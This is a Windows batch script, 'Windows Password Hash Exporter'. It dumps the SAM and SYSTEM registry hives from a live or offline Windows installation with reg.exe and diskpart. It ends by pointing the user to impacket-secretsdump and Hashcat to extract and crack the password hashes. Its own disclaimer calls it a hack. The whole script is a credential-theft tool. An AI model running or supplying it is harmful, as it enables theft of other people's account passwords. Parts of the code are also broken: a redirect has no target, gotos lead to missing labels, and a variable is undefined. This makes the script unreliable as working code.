@echo off
title Windows Password Hash Exporter
setlocal
echo Program Name: Windows Password Hash Exporter
echo Version: 5.0.4
echo License: GNU General Public License v3.0
echo Developer: @YonatanReuvenIsraeli
echo GitHub: https://github.com/YonatanReuvenIsraeli
echo Sponsor: https://github.com/sponsors/YonatanReuvenIsraeli
"%windir%\System32\net.exe" session > nul 2>&1
if not "%errorlevel%"=="0" goto "NotAdministrator"
goto "Disclaimer"

:"NotAdministrator"
echo.
echo Please run this batch file as an administrator. Press any key to close this batch file.
pause > nul 2>&1
goto "Done"

:"Disclaimer"
echo.
echo READ DISCLAIMER ^-^-^> THIS IS FOR EDUCATIONAL PURPOSES ONLY! DO NOT USE THIS ON SOMEONE ELSE'S PC WITHOUT THEIR EXPLICIT PERMISSION! THIS IS A HACK! CONTINUE AT YOUR OWN RISK! WE HOLD NO RESPONSIBILITY FOR ANYTHING THAT HAPPEND, IS HAPPENING, AND/OR WILL HAPPEN BECAUSE OF THIS BATCH FILE!
echo.
set Disclaimer=
set /p Disclaimer="Do you agree to the Disclaimer? (Yes/No) "
if /i "%Disclaimer%"=="Yes" goto "OnlineOffline"
if /i "%Disclaimer%"=="No" goto "Exit"
echo Invalid syntax!
goto "Disclaimer"

:"OnlineOffline"
echo.
set OnlineOffline=
set /p OnlineOffline="Are you getting the Windows password hashes of an online Windows installation or an offline Windows installation? (Online/Offline) "
if /i "%OnlineOffline%"=="Online" goto "Online"
if /i "%OnlineOffline%"=="Offline" goto "Volume"
echo Invalid syntax!
goto "OnlineOffline"

:"Volume"
if exist "diskpart.txt" goto "DiskPartExistVolume"
echo.
echo Listing volumes attached to this PC.
(echo list vol) > "diskpart.txt"
(echo exit) >> "diskpart.txt"
"%windir%\System32\diskpart.exe" /s "diskpart.txt" 2>&1
if not "%errorlevel%"=="0" goto "VolumeError"
del "diskpart.txt" /f /q > nul 2>&1
echo Volumes attached to this PC listed.
goto "WindowsAsk1"

:"DiskPartExistVolume"
set DiskPart=True
echo.
echo Please temporarily rename to something else or temporarily move to another location "diskpart.txt" in order for this batch file to proceed. "diskpart.txt" is not a system file. "diskpart.txt" is located in the folder "%cd%". Press any key to continue when "diskpart.txt" is renamed to something else or moved to another location. This batch file will let you know when you can rename it back to its original name or move it back to its original location.
pause > nul 2>&1
goto "Volume"

:"VolumeError"
del "diskpart.txt" /f /q > nul 2>&1
echo.
echo There has been an error! Press any key to try again.
pause > nul 2>&1
goto "Volume"

:"WindowsAsk1"
echo.
set WindowsVolume=
set /p WindowsVolume="What volume is the Windows volume? (0-?) "
goto "SureWindowsAsk1"

:"SureWindowsAsk1"
echo.
set SureWindowsAsk1=
set /p SureWindowsAsk1="Are you sure volume %WindowsVolume% is the Windows volume? (Yes/No) "
if /i "%SureWindowsAsk1%"=="Yes" goto "WindowsAsk2"
if /i "%SureWindowsAsk1%"=="No" goto "Volume"
echo Invalid syntax!
goto "SureWindowsAsk1"

:"WindowsAsk2"
echo.
set WindowsAsk=
set /p WindowsAsk="Is the Windows volume %WindowsVolume% already assigned a drive letter? (Yes/No) "
if /i "%WindowsAsk%"=="Yes" goto "SureWindowsAsk2"
if /i "%WindowsAsk%"=="No" goto "WindowsDriveLetter"
echo Invalid syntax!
goto "WindowsAsk2"

:"SureWindowsAsk2"
echo.
set SureWindowsAsk2=
set /p SureWindowsAsk2="Are you sure Windows volume %WindowsVolume% is already assigned a drive letter? (Yes/No) "
if /i "%SureWindowsAsk2%"=="Yes" goto "DriveLetterWindows"
if /i "%SureWindowsAsk2%"=="No" goto "WindowsAsk2"
echo Invalid syntax!
goto "SureWindowsAsk2"

:"WindowsDriveLetter"
echo.
echo Finding an available drive letter.
if not exist "A:" set WindowsDriveLetter=A:
if not exist "A:" goto "AvailableDriveLetterFound"
if not exist "B:" set WindowsDriveLetter=B:
if not exist "B:" goto "AvailableDriveLetterFound"
if not exist "C:" set WindowsDriveLetter=C:
if not exist "C:" goto "AvailableDriveLetterFound"
if not exist "D:" set WindowsDriveLetter=D:
if not exist "D:" goto "AvailableDriveLetterFound"
if not exist "E:" set WindowsDriveLetter=E:
if not exist "E:" goto "AvailableDriveLetterFound"
if not exist "F:" set WindowsDriveLetter=F:
if not exist "F:" goto "AvailableDriveLetterFound"
if not exist "G:" set WindowsDriveLetter=G:
if not exist "G:" goto "AvailableDriveLetterFound"
if not exist "H:" set WindowsDriveLetter=H:
if not exist "H:" goto "AvailableDriveLetterFound"
if not exist "I:" set WindowsDriveLetter=I:
if not exist "I:" goto "AvailableDriveLetterFound"
if not exist "J:" set WindowsDriveLetter=J:
if not exist "J:" goto "AvailableDriveLetterFound"
if not exist "K:" set WindowsDriveLetter=K:
if not exist "K:" goto "AvailableDriveLetterFound"
if not exist "L:" set WindowsDriveLetter=L:
if not exist "L:" goto "AvailableDriveLetterFound"
if not exist "M:" set WindowsDriveLetter=M:
if not exist "M:" goto "AvailableDriveLetterFound"
if not exist "N:" set WindowsDriveLetter=N:
if not exist "N:" goto "AvailableDriveLetterFound"
if not exist "O:" set WindowsDriveLetter=O:
if not exist "O:" goto "AvailableDriveLetterFound"
if not exist "P:" set WindowsDriveLetter=P:
if not exist "P:" goto "AvailableDriveLetterFound"
if not exist "Q:" set WindowsDriveLetter=Q:
if not exist "Q:" goto "AvailableDriveLetterFound"
if not exist "R:" set WindowsDriveLetter=R:
if not exist "R:" goto "AvailableDriveLetterFound"
if not exist "S:" set WindowsDriveLetter=S:
if not exist "S:" goto "AvailableDriveLetterFound"
if not exist "T:" set WindowsDriveLetter=T:
if not exist "T:" goto "AvailableDriveLetterFound"
if not exist "U:" set WindowsDriveLetter=U:
if not exist "U:" goto "AvailableDriveLetterFound"
if not exist "V:" set WindowsDriveLetter=V:
if not exist "V:" goto "AvailableDriveLetterFound"
if not exist "W:" set WindowsDriveLetter=W:
if not exist "W:" goto "AvailableDriveLetterFound"
if not exist "X:" set WindowsDriveLetter=X:
if not exist "X:" goto "AvailableDriveLetterFound"
if not exist "Y:" set WindowsDriveLetter=Y:
if not exist "Y:" goto "AvailableDriveLetterFound"
if not exist "Z:" set WindowsDriveLetter=Z:
if not exist "Z:" goto "AvailableDriveLetterFound"
echo No drive letter is available! Please unmount 1 drive and then press any key to try again.
pause > nul 2>&1
goto "WindowsDriveLetter"

:"AvailableDriveLetterFound"
echo Available drive letter found.
goto "AssignDriveLetterWindows"

:"AssignDriveLetterWindows"
if exist "diskpart.txt" goto "DiskPartExistAssignDriveLetterWindows"
echo.
echo Assigning Windows volume %WindowsVolume% drive letter "%WindowsDriveLetter%".
(echo automount scrub) >
(echo sel vol %WindowsVolume%) >> "diskpart.txt"
(echo assign letter=%WindowsDriveLetter%) >> "diskpart.txt"
(echo exit) >> "diskpart.txt"
"%windir%\System32\diskpart.exe" /s "diskpart.txt" > nul 2>&1
if not "%errorlevel%"=="0" goto "AssignDriveLetterWindowsError"
del "diskpart.txt" /f /q > nul 2>&1
echo Assigned Windows volume %WindowsVolume% drive letter "%WindowsDriveLetter%".
set DriveLetterWindows=%WindowsDriveLetter%
if not exist "%DriveLetterWindows%\Windows" goto "NotWindowsAssign"
goto "Start"

:"DiskPartExistAssignDriveLetterWindows"
set DiskPart=True
echo.
echo Please temporarily rename to something else or temporarily move to another location "diskpart.txt" in order for this batch file to proceed. "diskpart.txt" is not a system file. "diskpart.txt" is located in the folder "%cd%". Press any key to continue when "diskpart.txt" is renamed to something else or moved to another location. This batch file will let you know when you can rename it back to its original name or move it back to its original location.
pause > nul 2>&1
goto "AssignDriveLetterWindows"

:"AssignDriveLetterWindowsError"
del "diskpart.txt" /f /q > nul 2>&1
echo There has been an error! Press any key to try again.
pause > nul 2>&1
goto "WindowsDriveLetterExist"

:"NotWindowsAssign"
if exist "diskpart.txt" goto "DiskPartExistNotWindowsAssign"
echo.
echo Windows not installed on volume %WindowsVolume%! Removing drive letter "%DriveLetterWindows%" from volume %WindowsVolume%.
(echo sel vol %WindowsVolume%) > "diskpart.txt"
(echo remove letter=%DriveLetterWindows%) >> "diskpart.txt"
(echo exit) >> "diskpart.txt"
"%windir%\System32\diskpart.exe" /s "diskpart.txt" > nul 2>&1
if not "%errorlevel%"=="0" goto "NotWindowsAssignError"
del "diskpart.txt" /f /q > nul 2>&1
echo Removed drive letter "%DriveLetterWindows%" from volume %WindowsVolume%. Please try again.
goto "Volume"

:"DiskPartExistNotWindowsAssign"
set DiskPart=True
echo Please temporarily rename to something else or temporarily move to another location "diskpart.txt" in order for this batch file to proceed. "diskpart.txt" is not a system file. "diskpart.txt" is located in the folder "%cd%". Press any key to continue when "diskpart.txt" is renamed to something else or moved to another location. This batch file will let you know when you can rename it back to its original name or move it back to its original location.
pause > nul 2>&1
goto "NotWindowsAssign"

:"NotWindowsAssignError"
del "diskpart.txt" /f /q > nul 2>&1
echo There has been an error! Press any key to try again.
pause > nul 2>&1
goto "NotWindowsAssign"

:"DriveLetterWindows"
echo.
set DriveLetterWindows=
set /p DriveLetterWindows="What is the drive letter that Windows is installed on? (A:-Z:) "
if /i "%DriveLetterWindows%"=="A:" goto "SureDriveLetterWindows"
if /i "%DriveLetterWindows%"=="B:" goto "SureDriveLetterWindows"
if /i "%DriveLetterWindows%"=="C:" goto "SureDriveLetterWindows"
if /i "%DriveLetterWindows%"=="D:" goto "SureDriveLetterWindows"
if /i "%DriveLetterWindows%"=="E:" goto "SureDriveLetterWindows"
if /i "%DriveLetterWindows%"=="F:" goto "SureDriveLetterWindows"
if /i "%DriveLetterWindows%"=="G:" goto "SureDriveLetterWindows"
if /i "%DriveLetterWindows%"=="H:" goto "SureDriveLetterWindows"
if /i "%DriveLetterWindows%"=="I:" goto "SureDriveLetterWindows"
if /i "%DriveLetterWindows%"=="J:" goto "SureDriveLetterWindows"
if /i "%DriveLetterWindows%"=="K:" goto "SureDriveLetterWindows"
if /i "%DriveLetterWindows%"=="L:" goto "SureDriveLetterWindows"
if /i "%DriveLetterWindows%"=="M:" goto "SureDriveLetterWindows"
if /i "%DriveLetterWindows%"=="N:" goto "SureDriveLetterWindows"
if /i "%DriveLetterWindows%"=="O:" goto "SureDriveLetterWindows"
if /i "%DriveLetterWindows%"=="P:" goto "SureDriveLetterWindows"
if /i "%DriveLetterWindows%"=="Q:" goto "SureDriveLetterWindows"
if /i "%DriveLetterWindows%"=="R:" goto "SureDriveLetterWindows"
if /i "%DriveLetterWindows%"=="S:" goto "SureDriveLetterWindows"
if /i "%DriveLetterWindows%"=="T:" goto "SureDriveLetterWindows"
if /i "%DriveLetterWindows%"=="U:" goto "SureDriveLetterWindows"
if /i "%DriveLetterWindows%"=="V:" goto "SureDriveLetterWindows"
if /i "%DriveLetterWindows%"=="W:" goto "SureDriveLetterWindows"
if /i "%DriveLetterWindows%"=="X:" goto "SureDriveLetterWindows"
if /i "%DriveLetterWindows%"=="Y:" goto "SureDriveLetterWindows"
if /i "%DriveLetterWindows%"=="Z:" goto "SureDriveLetterWindows"
echo Invalid syntax!
goto "DriveLetterWindows"

:"SureDriveLetterWindows"
echo.
set SureDriveLetterWindows=
set /p SureDriveLetterWindows="Are you sure "%DriveLetterWindows%" is the drive letter that Windows is installed on? (Yes/No) "
if /i "%SureDriveLetterWindows%"=="Yes" goto "CheckExistDriveLetterWindows"
if /i "%SureDriveLetterWindows%"=="No" goto "DriveLetterWindows"
echo Invalid syntax!
goto "SureDriveLetterWindows"

:"CheckExistDriveLetterWindows"
if not exist "%DriveLetterWindows%" goto "DriveLetterWindowsNotExist"
if not exist "%DriveLetterWindows%\Windows" goto "NotWindows"
if /i "%DriveLetterWindows%"=="%SystemDrive%" goto "IsOnline"
goto "Start"

:"DriveLetterWindowsNotExist"
echo "%DriveLetterWindows%" does not exist! Please try again.
goto "Volume"

:"NotWindows"
echo Windows not installed on "%DriveLetterWindows%"!
goto "Volume"

:"IsOnline"
echo "%DriveLetterWindows%" is an online Windows installation!
goto "OnlineOffline"

:"Online"
echo.
set HashPath=
set /p HashPath="Where do you want to save the Windows password hashes to? "
if not exist "%HashPath%" goto "HashPathNotExistOnline"
goto "HashSetOnline"

:"HashPathNotExistOnline"
echo "%HashPath%" does not exist. Please try again.
goto "Online"

:"HashSetOnline"
set Hash=
goto "ExportOnline"

:"ExportOnline"
if exist "%HashPath%\Windows Password Hashes" goto "WindowsPasswordHashesExistOnline"
echo.
echo Exporting Windows password hashes on drive letter "%SystemDrive%".
md "%HashPath%\Windows Password Hashes" > nul 2>&1
"%windir%\System32\reg.exe" save HKLM\SAM "%HashPath%\Windows Password Hashes\SAM.save" > nul 2>&1
if not "%errorlevel%"=="0" goto "Error"
"%windir%\System32\reg.exe" save HKLM\SYSTEM "%HashPath%\Windows Password Hashes\SYSTEM.save" > nul 2>&1
if not "%errorlevel%"=="0" goto "Error"
echo Windows password hashes exported on drive letter "%SystemDrive%". 
goto "Done"

:"WindowsPasswordHashesExistOnline"
set Hash=True
echo.
echo Please temporarily rename to something else or temporarily move to another location "%HashPath%\Windows Password Hashes" in order for this batch file to proceed. "%HashPath%\Windows Password Hashes" is not a system file. Press any key to continue when "%HashPath%\Windows Password Hashes" is renamed to something else or moved to another location. This batch file will let you know when you can rename it back to its original name or move it back to its original location.
pause > nul 2>&1
goto "ExportOnline"

:"Offline"
set SAM=
set SYSTEM=
goto "RegistryCheck"

:"RegistryCheck"
if not exist "%DriveLetter%\Windows\System32\config" goto "InvalidWindowsInstallation"
"%windir%\System32\reg.exe" query HKLM | find /i "HKEY_LOCAL_MACHINE\SAM1" > nul 2>&1
if "%errorlevel%"=="0" goto "RegistryExistSAM"
"%windir%\System32\reg.exe" query HKLM | find /i "HKEY_LOCAL_MACHINE\SYSTEM1" > nul 2>&1
if "%errorlevel%"=="0" goto "RegistryExistSYSTEM"
goto "Load"

:"InvalidWindowsInstallation"
echo "%DriveLetterWindows%" is an invalid Windows installation! Please try again.
goto "Start"

:"RegistryExistSAM"
set SAM=True
echo.
echo Please temporarily rename to something else or temporarily move to another location "HKEY_LOCAL_MACHINE\SAM1" in order for this batch file to proceed. ""HKEY_LOCAL_MACHINE\SAM1"" is not a system hive. Press any key to continue when ""HKEY_LOCAL_MACHINE\SAM1"" is renamed to something else or moved to another location. This batch file will let you know when you can rename it back to its original name or move it back to its original location.
pause > nul 2>&1
goto "RegistryCheck"

:"RegistryExistSYSTEM"
set SYSTEM=True
echo.
echo Please temporarily rename to something else or temporarily move to another location "HKEY_LOCAL_MACHINE\SYSTEM1" in order for this batch file to proceed. "HKEY_LOCAL_MACHINE\SYSTEM1" is not a system hive. Press any key to continue when "HKEY_LOCAL_MACHINE\SYSTEM1" is renamed to something else or moved to another location. This batch file will let you know when you can rename it back to its original name or move it back to its original location.
pause > nul 2>&1
goto "RegistryCheck"

:"Load"
"%windir%\System32\reg.exe" load HKLM\SAM1 "%DriveLetterWindows%\Windows\System32\config\SAM" > nul 2>&1
"%windir%\System32\reg.exe" load HKLM\SYSTEM1 "%DriveLetterWindows%\Windows\System32\config\SYSTEM" > nul 2>&1
goto "HashPath"

:"HashPath"
echo.
set HashPath=
set /p HashPath="Where do you want to save the Windows password hashes to? "
if not exist "%HashPath%" goto "HashPathNotExistOffline"
goto "HashSetOffline"

:"HashPathNotExistOffline"
echo "%HashPath%" does not exist. Please try again.
goto "HashPath"

:"HashSetOffline"
set Hash=
goto "ExportOffline"

:"ExportOffline"
if exist "%HashPath%\Windows Password Hashes" goto "WindowsPasswordHashesExistOffline"
echo.
echo Exporting Windows password hashes on drive letter "%DriveLetterWindows%".
md "%HashPath%\Windows Password Hashes" > nul 2>&1
"%windir%\System32\reg.exe" save HKLM\SAM1 "%HashPath%\Windows Password Hashes\SAM.save" > nul 2>&1
if not "%errorlevel%"=="0" goto "Error"
"%windir%\System32\reg.exe" save HKLM\SYSTEM1 "%HashPath%\Windows Password Hashes\SYSTEM.save" > nul 2>&1
if not "%errorlevel%"=="0" goto "Error"
echo Windows password hashes exported on drive letter "%DriveLetterWindows%". 
"%windir%\System32\reg.exe" unload HKLM\SAM1 > nul 2>&1
"%windir%\System32\reg.exe" unload HKLM\SYSTEM1 > nul 2>&1
goto "RegistrySAMDone"

:"WindowsPasswordHashesExistOffline"
set Hash=True
echo.
echo Please temporarily rename to something else or temporarily move to another location "%HashPath%\Windows Password Hashes" in order for this batch file to proceed. "%HashPath%\Windows Password Hashes" is not a system file. Press any key to continue when "%HashPath%\Windows Password Hashes" is renamed to something else or moved to another location. This batch file will let you know when you can rename it back to its original name or move it back to its original location.
pause > nul 2>&1
goto "ExportOffline"

:"Error"
"%windir%\System32\reg.exe" unload HKLM\SAM1 > nul 2>&1
"%windir%\System32\reg.exe" unload HKLM\SYSTEM1 > nul 2>&1
echo There has been an error. you can try again.
goto "Start"

:"RegistrySAMDone"
if "%SAM%"=="True" goto "SAM"
goto "RegistrySYSTEMDone"

:"SAM"
echo.
echo You can now rename or move back the hive back to "HKEY_LOCAL_MACHINE\SAM1".
goto "RegistrySYSTEMDone"

:"RegistrySYSTEMDone"
if "%SYSTEM%"=="True" goto "SYSTEM"
goto "Done"

:"SYSTEM"
echo.
echo You can now rename or move back the hive back to "HKEY_LOCAL_MACHINE\SYSTEM1".
goto "Done"

:"Done"
echo.
echo Use impacket-secretsdump in Kali Linux to extract the hashes from "%HashPath%\Windows Password Hashes". You can then use a tool like Hashcat to crack the hash. Press any key to close this batch file.
endlocal
pause > nul 2>&1
exit
